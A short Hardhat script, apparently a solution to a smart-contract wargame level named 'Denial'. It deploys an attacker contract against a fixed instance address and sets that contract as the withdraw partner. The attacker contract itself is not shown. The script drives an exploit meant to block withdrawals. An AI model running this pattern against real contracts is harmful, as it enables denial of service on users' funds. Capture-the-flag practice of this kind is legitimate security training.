const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0x6eddF6C5A96A1cb40Bcfce07F6e37A75255c92D7";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("DenialAttack");
  const contract = await Contract.deploy(instanceAddress);

  const Instance = await ethers.getContractFactory("Denial");
  const instance = Instance.attach(instanceAddress);

  // Attack

  await instance.setWithdrawPartner(contract.address);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
